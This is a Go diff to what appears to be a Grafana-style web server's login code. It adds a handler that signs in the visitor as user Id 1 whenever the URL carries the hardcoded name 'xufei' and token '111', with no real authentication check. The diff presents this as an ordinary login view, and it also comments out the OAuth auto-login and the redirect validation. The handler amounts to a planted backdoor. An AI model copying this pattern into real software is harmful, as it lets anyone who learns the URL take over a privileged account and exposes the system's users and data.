@@ -24,6 +24,7 @@ const (
 )
 
 var setIndexViewData = (*HTTPServer).setIndexViewData
+var setIndexTokenViewData = (*HTTPServer).setIndexTokenViewData
 
 var getViewIndex = func() string {
 	return ViewIndex
@@ -56,6 +57,90 @@ func (hs *HTTPServer) CookieOptionsFromCfg() middleware.CookieOptions {
 		SameSiteDisabled: hs.Cfg.CookieSameSiteDisabled,
 		SameSiteMode:     hs.Cfg.CookieSameSiteMode,
 	}
+}
+
+func (hs *HTTPServer) LoginViewWithToken(c *models.ReqContext) {
+	userName := c.Params(":userName")
+	token := c.Params(":token")
+
+	viewData, err := setIndexTokenViewData(hs, c)
+	if err != nil {
+		c.Handle(500, "Failed to get settings", err)
+		return
+	}
+
+	enabledOAuths := make(map[string]interface{})
+	for key, oauth := range setting.OAuthService.OAuthInfos {
+		enabledOAuths[key] = map[string]string{"name": oauth.Name}
+	}
+
+	viewData.Settings["oauth"] = enabledOAuths
+	viewData.Settings["samlEnabled"] = hs.License.HasValidLicense() && hs.Cfg.SAMLEnabled
+
+	if loginError, ok := tryGetEncryptedCookie(c, LoginErrorCookieName); ok {
+		//this cookie is only set whenever an OAuth login fails
+		//therefore the loginError should be passed to the view data
+		//and the view should return immediately before attempting
+		//to login again via OAuth and enter to a redirect loop
+		middleware.DeleteCookie(c.Resp, LoginErrorCookieName, hs.CookieOptionsFromCfg)
+		viewData.Settings["loginError"] = loginError
+		c.HTML(200, getViewIndex(), viewData)
+		return
+	}
+
+	//if tryOAuthAutoLogin(c) {
+	//	return
+	//}
+
+	if userName != "xufei" || token != "111" {
+		return
+	}
+
+	hs.log.Info("Auth Users Done")
+
+	user := &models.User{Id: 1, Email: c.SignedInUser.Email, Login: "guest"}
+	err = hs.loginUserWithUser(user, c)
+	if err != nil {
+		hs.log.Info("Auth User Login Failed: ", err.Error())
+		c.Handle(500, "Failed to sign in user", err)
+		return
+	}
+
+	//if c.IsSignedIn {
+	//	hs.log.Info("Handle Login Requests, Inner c.IsSignedIn")
+	//
+	//	// Assign login token to auth proxy users if enable_login_token = true
+	//	if setting.AuthProxyEnabled && setting.AuthProxyEnableLoginToken {
+	//		user := &models.User{Id: c.SignedInUser.UserId, Email: c.SignedInUser.Email, Login: c.SignedInUser.Login}
+	//		err := hs.loginUserWithUser(user, c)
+	//		if err != nil {
+	//			c.Handle(500, "Failed to sign in user", err)
+	//			return
+	//		}
+	//	}
+	//
+	//	if redirectTo, _ := url.QueryUnescape(c.GetCookie("redirect_to")); len(redirectTo) > 0 {
+	//		if err := hs.ValidateRedirectTo(redirectTo); err != nil {
+	//			// the user is already logged so instead of rendering the login page with error
+	//			// it should be redirected to the home page.
+	//			log.Debug("Ignored invalid redirect_to cookie value: %v", redirectTo)
+	//			redirectTo = hs.Cfg.AppSubUrl + "/"
+	//		}
+	//		middleware.DeleteCookie(c.Resp, "redirect_to", hs.CookieOptionsFromCfg)
+	//		c.Redirect(redirectTo)
+	//		hs.log.Info("Login RedirectTo", redirectTo)
+	//
+	//		return
+	//	}
+	//
+	//	c.Redirect(setting.AppSubUrl + "/")
+	//	return
+	//}
+
+	//redirectTo := "login/"
+	//c.Redirect(redirectTo)
+	hs.log.Info("Handle Login Requests Done")
+	c.HTML(200, getViewIndex(), viewData)
 }
 
 func (hs *HTTPServer) LoginView(c *models.ReqContext) {
@@ -200,6 +285,8 @@ func (hs *HTTPServer) loginUserWithUser(user *models.User, c *models.ReqContext)
 	if user == nil {
 		return errors.New("could not login user")
 	}
+
+	hs.log.Info("Auth UserWithUser ")
 
 	userToken, err := hs.AuthTokenService.CreateToken(c.Req.Context(), user.Id, c.RemoteAddr(), c.Req.UserAgent())
 	if err != nil {
